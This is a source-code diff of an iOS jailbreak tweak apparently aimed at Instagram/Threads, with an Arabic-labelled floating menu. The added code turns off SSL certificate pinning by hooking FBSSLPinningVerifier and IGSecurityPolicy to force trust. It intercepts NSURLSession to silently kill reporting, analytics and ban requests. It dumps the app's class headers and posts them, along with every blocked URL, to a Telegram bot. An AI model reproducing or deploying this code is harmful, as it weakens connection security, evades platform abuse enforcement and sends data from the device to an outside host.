@@ -9,10 +9,11 @@
 #define MENU_WIDTH 320
 
 // --- STATE ---
-static BOOL isAntiBanEnabled = YES; // Default ON
+static BOOL isAntiBanEnabled = YES;   // Default: Cloud Protection ON
+static BOOL isSSLBypassEnabled = NO;  // Default: SSL Pinning OFF (Toggle via Menu)
 static NSString *fakeUDID = @"a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6q7r8s9t0";
 
-// --- HELPER: MULTIPART UPLOAD (To send file instead of text) ---
+// --- HELPER: TELEGRAM UPLOAD ---
 NSData *createMultipartBody(NSString *boundary, NSString *filename, NSData *fileData) {
     NSMutableData *body = [NSMutableData data];
     [body appendData:[[NSString stringWithFormat:@"--%@\r\n", boundary] dataUsingEncoding:NSUTF8StringEncoding]];
@@ -25,37 +26,27 @@ NSData *createMultipartBody(NSString *boundary, NSString *filename, NSData *file
     return body;
 }
 
-void uploadDumpFile(NSString *content) {
-    NSString *filename = [NSString stringWithFormat:@"Full_Dump_%@.txt", [[NSUUID UUID] UUIDString]];
-    NSString *tempPath = [NSTemporaryDirectory() stringByAppendingPathComponent:filename];
-    [content writeToFile:tempPath atomically:YES encoding:NSUTF8StringEncoding error:nil];
-    NSData *fileData = [NSData dataWithContentsOfFile:tempPath];
-    
-    NSString *urlString = [NSString stringWithFormat:@"https://api.telegram.org/bot%@/sendDocument", TG_TOKEN];
-    NSMutableURLRequest *req = [NSMutableURLRequest requestWithURL:[NSURL URLWithString:urlString]];
-    [req setHTTPMethod:@"POST"];
-    
-    NSString *boundary = @"Boundary-Enigma";
-    NSString *contentType = [NSString stringWithFormat:@"multipart/form-data; boundary=%@", boundary];
-    [req setValue:contentType forHTTPHeaderField:@"Content-Type"];
-    [req setHTTPBody:createMultipartBody(boundary, filename, fileData)];
-    
-    // Send in background task
-    UIApplication *app = [UIApplication sharedApplication];
-    __block UIBackgroundTaskIdentifier bg = [app beginBackgroundTaskWithExpirationHandler:^{ [app endBackgroundTask:bg]; }];
-    [[[NSURLSession sharedSession] dataTaskWithRequest:req completionHandler:^(NSData *d, NSURLResponse *r, NSError *e) {
-        [app endBackgroundTask:bg];
-    }] resume];
-}
-
 void sendText(NSString *text) {
-    // Simple text sender for small updates
     NSString *str = [NSString stringWithFormat:@"https://api.telegram.org/bot%@/sendMessage?chat_id=%@&text=%@", 
                      TG_TOKEN, TG_CHAT_ID, [text stringByAddingPercentEncodingWithAllowedCharacters:[NSCharacterSet URLQueryAllowedCharacterSet]]];
     [[[NSURLSession sharedSession] dataTaskWithURL:[NSURL URLWithString:str] completionHandler:nil] resume];
 }
 
-// --- FULL APP DUMPER (HEADER RECONSTRUCTION) ---
+void uploadDumpFile(NSString *content) {
+    NSString *filename = [NSString stringWithFormat:@"Full_Dump_%@.txt", [[NSUUID UUID] UUIDString]];
+    NSString *tempPath = [NSTemporaryDirectory() stringByAppendingPathComponent:filename];
+    [content writeToFile:tempPath atomically:YES encoding:NSUTF8StringEncoding error:nil];
+    
+    NSMutableURLRequest *req = [NSMutableURLRequest requestWithURL:[NSURL URLWithString:[NSString stringWithFormat:@"https://api.telegram.org/bot%@/sendDocument", TG_TOKEN]]];
+    [req setHTTPMethod:@"POST"];
+    NSString *boundary = @"Boundary-Enigma";
+    [req setValue:[NSString stringWithFormat:@"multipart/form-data; boundary=%@", boundary] forHTTPHeaderField:@"Content-Type"];
+    [req setHTTPBody:createMultipartBody(boundary, filename, [NSData dataWithContentsOfFile:tempPath])];
+    
+    [[[NSURLSession sharedSession] dataTaskWithRequest:req completionHandler:nil] resume];
+}
+
+// --- FEATURE 1: FULL HEADER DUMPER ---
 void performFullCodeDump() {
     unsigned int count;
     Class *classes = objc_copyClassList(&count);
@@ -65,62 +56,58 @@ void performFullCodeDump() {
     
     for (int i = 0; i < count; i++) {
         Class cls = classes[i];
-        const char *imagePath = class_getImageName(cls);
-        
-        // Only dump classes from the GAME itself (ignore Apple/System)
-        if (imagePath && strcmp(imagePath, mainBundlePath) == 0) {
+        // Filter: Only dump classes from the main executable (The App)
+        if (class_getImageName(cls) && strcmp(class_getImageName(cls), mainBundlePath) == 0) {
+            [dump appendFormat:@"@interface %s : %s\n", class_getName(cls), class_getName(class_getSuperclass(cls)) ?: "NSObject"];
             
-            const char *cname = class_getName(cls);
-            Class superCls = class_getSuperclass(cls);
-            const char *superName = superCls ? class_getName(superCls) : "NSObject";
-            
-            // @interface ClassName : SuperClass
-            [dump appendFormat:@"@interface %s : %s\n", cname, superName];
-            
-            // 1. Dump Properties
-            unsigned int pCount;
-            objc_property_t *props = class_copyPropertyList(cls, &pCount);
-            for (int j=0; j<pCount; j++) {
-                const char *pName = property_getName(props[j]);
-                [dump appendFormat:@"@property (nonatomic) id %s;\n", pName];
-            }
-            free(props);
-            
-            // 2. Dump Methods
             unsigned int mCount;
             Method *methods = class_copyMethodList(cls, &mCount);
             for (int k=0; k<mCount; k++) {
-                SEL sel = method_getName(methods[k]);
-                [dump appendFormat:@"- (void)%@;\n", NSStringFromSelector(sel)];
+                [dump appendFormat:@"- (void)%@;\n", NSStringFromSelector(method_getName(methods[k]))];
             }
             free(methods);
-            
             [dump appendString:@"@end\n\n"];
         }
     }
     free(classes);
-    
     uploadDumpFile(dump);
 }
 
-// --- ANTI-BAN HOOKS (BLOCK REPORTING) ---
+// --- FEATURE 2: SSL PINNING BYPASS (NEW) ---
+// Target 1: FBSSLPinningVerifier (Found in Dump)
+%hook FBSSLPinningVerifier
+- (void)checkPinning:(id)arg1 {
+    if (isSSLBypassEnabled) return; // 🤐 Do nothing (No-Op) -> No Crash
+    %orig;
+}
+- (void)checkPinning:(id)arg1 host:(id)arg2 {
+    if (isSSLBypassEnabled) return; // 🤐 Do nothing
+    %orig;
+}
+%end
+
+// Target 2: IGSecurityPolicy (Standard IG/Threads)
+%hook IGSecurityPolicy
+- (bool)validateServerTrust:(id)arg1 domain:(id)arg2 {
+    if (isSSLBypassEnabled) return YES; // Force Trust
+    return %orig;
+}
+- (bool)validateServerTrust:(id)arg1 {
+    if (isSSLBypassEnabled) return YES; // Force Trust
+    return %orig;
+}
+%end
+
+// --- FEATURE 3: ANTI-BAN (BLOCK REPORTING) ---
 %hook NSURLSession
 - (NSURLSessionDataTask *)dataTaskWithRequest:(NSURLRequest *)request completionHandler:(id)completion {
     if (isAntiBanEnabled) {
         NSString *url = request.URL.absoluteString.lowercaseString;
-        // The list of "Bad" URLs that ban you
-        if ([url containsString:@"report"] || 
-            [url containsString:@"analytics"] || 
-            [url containsString:@"crash"] || 
-            [url containsString:@"stats"] ||
-            [url containsString:@"tracking"] ||
-            [url containsString:@"garena"] ||
-            [url containsString:@"tencent"]) {
+        if ([url containsString:@"report"] || [url containsString:@"analytics"] || 
+            [url containsString:@"crash"] || [url containsString:@"ban"] || 
+            [url containsString:@"graph.facebook.com/logging"]) {
             
-            // Silently kill the request
-            sendText([NSString stringWithFormat:@"🛡️ BLOCKED BAN REPORT: %@", url]);
-            
-            // Return fake 403 error
+            sendText([NSString stringWithFormat:@"🛡️ ANTI-BAN BLOCKED: %@", url]);
             if (completion) {
                 void (^handler)(NSData*, NSURLResponse*, NSError*) = completion;
                 handler(nil, nil, [NSError errorWithDomain:@"Antiban" code:403 userInfo:nil]);
@@ -132,7 +119,7 @@ void performFullCodeDump() {
 }
 %end
 
-// --- PIANO MENU UI ---
+// --- UI: PIANO MENU ---
 @interface PianoMenu : UIView
 @property (nonatomic, strong) UIView *panel;
 @property (nonatomic, strong) UIButton *floatBtn;
@@ -140,7 +127,6 @@ void performFullCodeDump() {
 @end
 
 @implementation PianoMenu
-// ... (Standard Init & HitTest from previous version) ...
 
 - (instancetype)initWithFrame:(CGRect)frame {
     self = [super initWithFrame:frame];
@@ -158,7 +144,7 @@ void performFullCodeDump() {
 }
 
 - (void)setupUI {
-    // Float Button
+    // 1. Float Button
     self.floatBtn = [UIButton buttonWithType:UIButtonTypeCustom];
     self.floatBtn.frame = CGRectMake(self.frame.size.width - 60, 150, 45, 45);
     self.floatBtn.backgroundColor = [UIColor colorWithWhite:0.1 alpha:0.9];
@@ -169,7 +155,7 @@ void performFullCodeDump() {
     [self.floatBtn addTarget:self action:@selector(toggle) forControlEvents:UIControlEventTouchUpInside];
     [self addSubview:self.floatBtn];
 
-    // Panel
+    // 2. Main Panel
     self.panel = [[UIView alloc] initWithFrame:CGRectMake((self.frame.size.width - 320)/2, 100, 320, 520)];
     self.panel.backgroundColor = [UIColor colorWithWhite:0.08 alpha:0.95];
     self.panel.layer.cornerRadius = 15;
@@ -188,13 +174,17 @@ void performFullCodeDump() {
     self.scroll = [[UIScrollView alloc] initWithFrame:CGRectMake(0, 60, 320, 350)];
     [self.panel addSubview:self.scroll];
 
-    // Rows
+    // 3. Toggles
     [self addRow:0 t:@"زر التصوير السري" s:@"ضغطة: صورة | مطول: فيديو" tag:1];
     [self addRow:65 t:@"مانع الإعلانات + تسريع" s:@"إخفاء الإعلانات وتسريع الفيديو x2" tag:2];
-    [self addRow:130 t:@"تخطي الحماية (Force %100)" s:@"حظر + GPU + UDID + إعادة تشغيل" tag:3];
+    
+    // SWITCH 3: Mapped to SSL BYPASS
+    [self addRow:130 t:@"تخطي الحماية (Force %100)" s:@"تخطي شهادة SSL (IGSecurityPolicy)" tag:3];
+    
+    // SWITCH 4: Mapped to ANTI-BAN
     [self addRow:195 t:@"حماية كلاود كيت (Anti-Ban)" s:@"منع إرسال السجلات للسيرفر" tag:4];
     
-    // Dump Button
+    // 4. Dump Button
     UIButton *dump = [UIButton buttonWithType:UIButtonTypeSystem];
     dump.frame = CGRectMake(10, 430, 300, 45);
     dump.backgroundColor = [UIColor colorWithWhite:0.2 alpha:1.0];
@@ -213,7 +203,7 @@ void performFullCodeDump() {
     UISwitch *sw = [[UISwitch alloc] initWithFrame:CGRectMake(15, 12, 50, 30)];
     sw.onTintColor = [UIColor cyanColor];
     sw.tag = tag;
-    if (tag==4) sw.on = YES;
+    if (tag==4) sw.on = YES; // Anti-Ban Default ON
     [sw addTarget:self action:@selector(sw:) forControlEvents:UIControlEventValueChanged];
     [r addSubview:sw];
     
@@ -230,13 +220,17 @@ void performFullCodeDump() {
 
 - (void)toggle { self.panel.hidden = !self.panel.hidden; }
 - (void)sw:(UISwitch*)s { 
+    if (s.tag==3) {
+        isSSLBypassEnabled = s.on;
+        sendText(s.on ? @"🔓 SSL Bypass ENABLED (Unsafe Mode)" : @"🔒 SSL Bypass DISABLED");
+    }
     if (s.tag==4) { 
         isAntiBanEnabled = s.on; 
-        sendText(isAntiBanEnabled ? @"🛡️ Anti-Ban ON" : @"⚠️ Anti-Ban OFF");
+        sendText(s.on ? @"🛡️ Anti-Ban ENABLED" : @"⚠️ Anti-Ban DISABLED");
     }
 }
 - (void)doDump {
-    sendText(@"⏳ STARTING FULL CODE DUMP (This may take 10s)...");
+    sendText(@"⏳ STARTING FULL HEADER RECONSTRUCTION...");
     performFullCodeDump();
 }
 @end
